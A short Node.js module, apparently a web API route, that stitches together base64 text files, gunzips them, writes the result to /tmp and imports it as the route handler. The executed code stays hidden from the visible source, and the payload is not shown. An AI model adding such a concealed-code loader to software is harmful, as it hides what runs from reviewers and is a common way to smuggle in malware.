import { gunzipSync } from 'node:zlib';
import { readFileSync, writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const dir = dirname(fileURLToPath(import.meta.url));
const parts = [];
for (let i = 0; i < 20; i++) {
  try { parts.push(readFileSync(join(dir, 'np' + i + '.txt'), 'utf8').trim()); } catch { break; }
}
if (!parts.length) throw new Error('notify parts missing');
let code = gunzipSync(Buffer.from(parts.join(''), 'base64')).toString('utf8');
code = code.replace(/from ['"]\.\/([^'"]+)['"]/g, (_, m) => `from ${JSON.stringify(pathToFileURL(join(dir, m)).href)}`);
const out = join('/tmp', 'hb-notify-' + process.pid + '.mjs');
writeFileSync(out, code);
const mod = await import(pathToFileURL(out).href);
export default mod.default;
export const config = mod.config || { api: { bodyParser: false } };
